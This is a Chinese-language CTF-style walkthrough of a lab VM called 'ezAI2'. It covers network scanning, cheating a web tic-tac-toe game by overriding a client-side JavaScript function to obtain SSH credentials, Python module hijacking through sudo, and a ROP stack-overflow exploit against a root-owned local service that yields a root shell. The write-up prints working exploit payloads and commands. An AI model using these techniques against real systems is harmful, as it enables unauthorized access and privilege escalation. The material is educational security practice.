# 信息收集

我先在当前网段扫了一遍主机。

```bash
sudo arp-scan -l
```

```text
Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
192.168.205.138 08:00:27:08:30:1a       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f3:97:56       VMware, Inc.
```

这里可疑目标是 `192.168.205.138`，看网卡厂商也像靶机虚拟网卡。接着全端口扫一下确认攻击面。

```bash
nmap -p 0-65535 192.168.205.138
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

只开了 `22` 和 `8080`，所以顺序很自然：先看 8080 的 Web 逻辑，能不能打出凭据再进 SSH。

# Web 入口与前端逻辑篡改

8080 是个井字棋页面。看源码时我马上留意到这段：

```html
<script src="wasm_exec.js"></script>
```

以及游戏关键逻辑：

```javascript
// AI Move
document.getElementById('status').innerText = "AI THINKING...";
setTimeout(() => {
    const aiMove = getAIMove(board);
    board[aiMove] = 2;
    moves.push(aiMove);
    updateProof(aiMove, moves.length - 1);
    updateUI();

    if (checkWin(2)) {
        gameOver = true;
        showModal('💥 AI WINS', 'AI 击败了你！\n想再试一次吗?', 'win');
        document.getElementById('modal-button').onclick = resetGame;
    } else if (board.every(c => c !== 0)) {
        gameOver = true;
        showModal('🤝 DRAW', '平手了！再来一局?', 'draw');
        document.getElementById('modal-button').onclick = resetGame;
    } else {
        document.getElementById('status').innerText = "YOUR TURN (X)";
        // Unlock player turn
        isPlayerTurn = true;
    }
}, 50);
```

```javascript
async function handleWin() {
    document.getElementById('status').innerText = "IMPOSSIBLE! VERIFYING...";
    gameOver = true;
  
    const proof = getCurrentProof();
    const resp = await fetch("/win", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            session_id: sessionID,
            moves: moves,
            proof: proof
        })
    });

    if (resp.ok) {
        const data = await resp.json();
        document.getElementById('flag-display').classList.remove('hidden');
        document.getElementById('flag-text').innerText = data.flag;
        document.getElementById('status').innerText = "SYSTEM COMPROMISED.";
      
        showModal('🎉 SUCCESS!', '你赢了，这是一组有效的凭据', 'win');
        document.getElementById('modal-button').textContent = '关闭';
        document.getElementById('modal-button').onclick = () => hideModal();
    } else {
        document.getElementById('status').innerText = "VERIFICATION FAILED.";
    }
}
```

这段逻辑给我的判断很明确：

- AI 是 minimax，不会正常输；
- 每步会更新 proof，服务端会验证；
- 但 `getAIMove` 在全局作用域，可被前端 JS 直接覆盖。

我在浏览器 F12 控制台里，刷新后立即打了这个覆盖：

```javascript
getAIMove = function(b) {
    for (let i = 8; i >= 0; i--) {
        if (b[i] === 0) return i;
    }
    return 0;
};
```

这一步的目的就是把“不可战胜 AI”降级成“固定选最后空位”的弱 AI。因为我没有篡改 proof 流程，服务器验证也能过，最终页面给出一组 SSH 凭据：

```text
ttt:1q2w3e4r@Dashazi
```

# SSH 落地与 sudo 面分析

拿到凭据后直接登录。

```bash
ssh ttt@192.168.205.138
```

```text
ttt@ezAI2:~$ id
uid=1000(ttt) gid=1000(ttt) groups=1000(ttt)
```

先看 sudo 权限：

```bash
sudo -l
```

```text
User ttt may run the following commands on ezAI2:
    (yolo) NOPASSWD: /usr/bin/python3 /opt/greeting.py
```

这条 sudo 很关键：能以 `yolo` 身份跑指定 Python 脚本。接着看脚本内容和目录权限。

```bash
cat /opt/greeting.py
```

```python
import datetime
import random
...
if __name__ == "__main__":
    main()
```

```bash
ls -la /opt/
```

```text
drwxrwxrwt  3 root     root     4096 Feb 26 02:08 .
...
-rw-r--r--  1 yolo     yolo     2837 Feb 26 01:57 greeting.py
```

`/opt` 是可写，而脚本里有 `import datetime`。我直接走模块劫持，把同名模块丢到 `/opt`。

```bash
cat > /opt/datetime.py << 'EOF'
import os
os.system("/bin/bash")
EOF
```

```bash
sudo -u yolo /usr/bin/python3 /opt/greeting.py
```

```text
yolo@ezAI2:/home/ttt$ id
uid=1001(yolo) gid=1001(yolo) groups=1001(yolo)
```

这里拿到 `yolo` shell，说明导入链被成功劫持，sudo 限制等于被绕开了。

# yolo 到 root：本地服务与二进制分析

拿到 `yolo` 后先看监听面：

```bash
ss -tlnp
```

```text
LISTEN 0 20 127.0.0.1:9999 0.0.0.0:*
LISTEN 0 128 0.0.0.0:22    0.0.0.0:*
LISTEN 0 128 *:8080        *:*
```

`127.0.0.1:9999` 很像本地提权点。看家目录发现一个可执行文件：

```bash
ls -la /home/yolo
```

```text
-rwxr-x--- 1 root yolo 17584 Feb 26 02:19 waityou
```

再确认进程归属：

```bash
ps aux|grep waityou
```

```text
root         379  0.0  0.0   2228   560 ?        Ss   22:57   0:00 /home/yolo/waityou
```

root 在跑它，且 yolo 组可执行，这就很典型了。

## 快速静态信息

```bash
strings /home/yolo/waityou
```

```text
>>> Enter Access Code:
...
gadget_shop
vuln
system
127.0.0.1
...
```

`gadget_shop`、`vuln`、`system` 这些符号名非常友好，基本是在暗示 ROP。
我在 IDA 看了 `vuln` 伪代码，核心是：

```c
ssize_t vuln(int a1) {
    char buf[64];
    // ...
    return read(0, buf, 0x100); 
}
```

64 字节栈缓冲区读入 0x100，标准栈溢出。

## 定位 gadget、system 和 /bin/sh 参数

我在机器上直接用 objdump 把关键地址抠出来。

```bash
objdump -d waityou | grep -A5 "gadget_shop"
```

```text
0000000000401242 <gadget_shop>:
  401242:       55                      push   %rbp
  401243:       48 89 e5                mov    %rsp,%rbp
  401246:       5f                      pop    %rdi
  401247:       c3                      retq
```

可直接用 `0x401246` 作为 `pop rdi; ret`。

```bash
objdump -t waityou | grep system
```

```text
0000000000401050       F *UND*  0000000000000000              system@GLIBC_2.2.5
0000000000404108 g     O .data  0000000000000008              __keep_system_plt
```

`system@plt` 可用，地址 `0x401050`。

```bash
objdump -s -j .data waityou
```

```text
4040e0 7368006d 61792062 65207368 65206973  sh.may be she is
```

`.data` 里开头就是 `sh\x00`，地址 `0x4040e0`，正好当参数。

偏移量按栈布局算 `64 + 8 = 72`，构造 ROP 链就是：

- padding 72
- `pop rdi ; ret`
- `0x4040e0`（"sh"）
- `system@plt`

# 打本地 9999 触发 root shell

```bash
(python3 -c "
import struct
pop_rdi = 0x401246  
sh_addr = 0x4040e0  
system_plt = 0x401050 
payload = b'A' * 72             
payload += struct.pack('<Q', pop_rdi) 
payload += struct.pack('<Q', sh_addr) 
payload += struct.pack('<Q', system_plt) 
import sys
sys.stdout.buffer.write(payload)
"; cat) |busybox nc 127.0.0.1 9999
```

```text
>>> Initializing romantic link...
>>> [LOG] 「私、幸せになる勇気がなかったの。」
>>> Enter Access Code: id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
flag{4c00347e1f124840bc0a081aa77d9094}  
cat /home/ttt/user.txt
flag{7f0a4a443fbb441792197c6d9f1f52dd}
```